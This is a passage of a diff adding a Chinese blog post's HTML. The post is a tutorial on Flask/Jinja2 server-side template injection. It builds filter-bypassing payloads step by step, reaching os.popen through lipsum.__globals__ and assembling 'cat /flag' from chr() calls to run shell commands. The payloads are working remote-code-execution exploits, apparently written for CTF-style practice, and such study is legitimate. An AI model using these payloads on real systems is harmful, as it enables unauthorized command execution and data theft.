+</span></span><span class="line"><span class="cl">获取get，以便我们使用get()获取到os模块。
+</span></span><span class="line"><span class="cl">{%set get=dict(get=a)|join%}{%print get%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%set pop=dict(po=a,p=b)|join%}
+</span></span><span class="line"><span class="cl">{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
+</span></span><span class="line"><span class="cl">{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
+</span></span><span class="line"><span class="cl">{%set shell=dict(o=a,s=b)|join%}
+</span></span><span class="line"><span class="cl">{%set get=dict(get=a)|join%}
+</span></span><span class="line"><span class="cl">{%print (lipsum|attr(globals))|attr(get)(shell)%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="获取popen方法">获取popen方法
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%set popen=dict(popen=a)|join%}{%print popen%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%set pop=dict(po=a,p=b)|join%}
+</span></span><span class="line"><span class="cl">{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
+</span></span><span class="line"><span class="cl">{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
+</span></span><span class="line"><span class="cl">{%set shell=dict(o=a,s=b)|join%}
+</span></span><span class="line"><span class="cl">{%set get=dict(get=a)|join%}
+</span></span><span class="line"><span class="cl">{%set popen=dict(popen=a)|join%}
+</span></span><span class="line"><span class="cl">{%print (lipsum|attr(globals))|attr(get)(shell)|attr(popen)%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="执行shell命令">执行shell命令
+</h3><p>拼接shell命令我们需要使用chr函数，因为chr不是flask的函数，所以我们必须自己获取。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(lipsum|attr(&#34;__globals__&#34;))|attr(&#34;__builtins__&#34;)|attr(get)(chr)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">获取__builtins__
+</span></span><span class="line"><span class="cl">{%set pop=dict(po=a,p=b)|join%}
+</span></span><span class="line"><span class="cl">{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
+</span></span><span class="line"><span class="cl">{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
+</span></span><span class="line"><span class="cl">{%print builtins%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">获取chr
+</span></span><span class="line"><span class="cl">{%set pop=dict(po=a,p=b)|join%}
+</span></span><span class="line"><span class="cl">{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
+</span></span><span class="line"><span class="cl">{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
+</span></span><span class="line"><span class="cl">{%set get=dict(get=a)|join%}
+</span></span><span class="line"><span class="cl">{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
+</span></span><span class="line"><span class="cl">{%set ch=dict(chr=a)|join%}
+</span></span><span class="line"><span class="cl">{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%}
+</span></span><span class="line"><span class="cl">{%print char%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们以&quot;cat /flag&quot;命令为例。拼接命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%set pop=dict(po=a,p=b)|join%}
+</span></span><span class="line"><span class="cl">{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
+</span></span><span class="line"><span class="cl">{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
+</span></span><span class="line"><span class="cl">{%set get=dict(get=a)|join%}
+</span></span><span class="line"><span class="cl">{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
+</span></span><span class="line"><span class="cl">{%set ch=dict(chr=a)|join%}
+</span></span><span class="line"><span class="cl">{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%}
+</span></span><span class="line"><span class="cl">{%set command=char(99)%2bchar(97)%2bchar(116)%2bchar(32)%2bchar(47)%2bchar(102)%2bchar(108)%2bchar(97)%2bchar(103)%}
+</span></span><span class="line"><span class="cl">{%print command%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%set pop=dict(po=a,p=b)|join%}
+</span></span><span class="line"><span class="cl">{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
+</span></span><span class="line"><span class="cl">{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
+</span></span><span class="line"><span class="cl">{%set get=dict(get=a)|join%}
+</span></span><span class="line"><span class="cl">{%set shell=dict(o=a,s=b)|join%}
+</span></span><span class="line"><span class="cl">{%set popen=dict(popen=a)|join%}
+</span></span><span class="line"><span class="cl">{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
+</span></span><span class="line"><span class="cl">{%set ch=dict(ch=a,r=b)|join%}
+</span></span><span class="line"><span class="cl">{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%}
+</span></span><span class="line"><span class="cl">{%set command=char(99)%2bchar(97)%2bchar(116)%2bchar(32)%2bchar(47)%2bchar(102)%2bchar(108)%2bchar(97)%2bchar(103)%}
+</span></span><span class="line"><span class="cl">{%set result=(lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)%}
+</span></span><span class="line"><span class="cl">{%print result%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是这里用的是popen,popen()方法执行的返回结果是一个file对象，我们需要在使用read()函数进行读取。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%set pop=dict(po=a,p=b)|join%}
+</span></span><span class="line"><span class="cl">{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
+</span></span><span class="line"><span class="cl">{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
+</span></span><span class="line"><span class="cl">{%set get=dict(get=a)|join%}
+</span></span><span class="line"><span class="cl">{%set shell=dict(o=a,s=b)|join%}
+</span></span><span class="line"><span class="cl">{%set popen=dict(popen=a)|join%}
+</span></span><span class="line"><span class="cl">{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
+</span></span><span class="line"><span class="cl">{%set ch=dict(ch=a,r=b)|join%}
+</span></span><span class="line"><span class="cl">{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%}
+</span></span><span class="line"><span class="cl">{%set command=char(99)%2bchar(97)%2bchar(116)%2bchar(32)%2bchar(47)%2bchar(102)%2bchar(108)%2bchar(97)%2bchar(103)%}
+</span></span><span class="line"><span class="cl">{%set read=dict(read=a)|join%}
+</span></span><span class="line"><span class="cl">{%set result=(lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)|attr(read)()%}
+</span></span><span class="line"><span class="cl">{%print result%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ssti/">SSTI</a>
+        
+            <a href="/tags/flask/">Flask</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.12f747bb3ec58fc56270470713ba0ba0.png" 
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post python内存马学习"
+                        
+                        data-hash="md5-EvdHuz7Fj8VicEcHE7oLoA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">python内存马学习</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.1b0b5baf2fbab6af45f40a9c0e824c92.png" 
+                        width="1792" 
+                        height="2560" 
+                        loading="lazy"
+                        alt="Featured image of post python格式化字符串漏洞"
+                        
+                        data-hash="md5-Gwtbry&#43;6tq9F9AqcDoJMkg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">python格式化字符串漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.a84481e2accdd7ee83233c01f9ed1648.jpg" 
+                        width="3363" 
+                        height="5979" 
+                        loading="lazy"
+                        alt="Featured image of post pickle反序列化"
+                        
+                        data-hash="md5-qESB4qzN1&#43;6DIzwB&#43;e0WSA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">pickle反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+        
+        
+            <div class="article-image">
+                <img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.dc132e18a0a94c1b0e3d04241faabc01.png" 
+                        width="928" 
+                        height="1232" 
+                        loading="lazy"
+                        alt="Featured image of post python原型链污染"
+                        
+                        data-hash="md5-3BMuGKCpTBsOPQQkH6q8AQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">python原型链污染</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@main";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
